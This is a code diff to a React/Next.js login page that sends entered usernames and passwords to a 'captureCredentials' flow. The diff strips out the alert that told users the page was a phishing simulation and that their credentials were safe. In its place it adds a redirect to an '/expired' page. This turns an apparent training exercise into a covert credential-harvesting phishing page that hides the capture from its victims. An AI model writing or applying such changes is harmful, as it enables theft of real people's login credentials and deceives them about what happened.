@@ -1,32 +1,20 @@
 'use client';
 import { FormEvent, useState } from 'react';
+import { useRouter } from 'next/navigation';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import {
-  AlertDialog,
-  AlertDialogAction,
-  AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogFooter,
-  AlertDialogHeader,
-  AlertDialogTitle,
-} from '@/components/ui/alert-dialog';
-import { ShieldAlert } from 'lucide-react';
 
 export default function Home() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [showAlert, setShowAlert] = useState(false);
+  const router = useRouter();
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     await captureCredentials({ username, password });
-    setShowAlert(true);
-    // Reset form
-    setUsername('');
-    setPassword('');
+    router.push('/expired');
   };
 
   return (
@@ -71,27 +59,6 @@ export default function Home() {
           </div>
         </CardContent>
       </Card>
-
-      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
-        <AlertDialogContent>
-          <AlertDialogHeader>
-            <AlertDialogTitle className="flex items-center gap-2 text-xl">
-              <ShieldAlert className="text-yellow-500 h-8 w-8" />
-              This was a Phishing Simulation
-            </AlertDialogTitle>
-            <AlertDialogDescription className="text-base pt-4">
-              This was a test to help you recognize phishing attempts. Your credentials were recorded for this simulation but have not been compromised.
-              <br/><br/>
-              Always check the URL and sender before entering your credentials.
-            </AlertDialogDescription>
-          </AlertDialogHeader>
-          <AlertDialogFooter>
-            <AlertDialogAction onClick={() => setShowAlert(false)}>
-              Continue
-            </AlertDialogAction>
-          </AlertDialogFooter>
-        </AlertDialogContent>
-      </AlertDialog>
     </div>
   );
 }
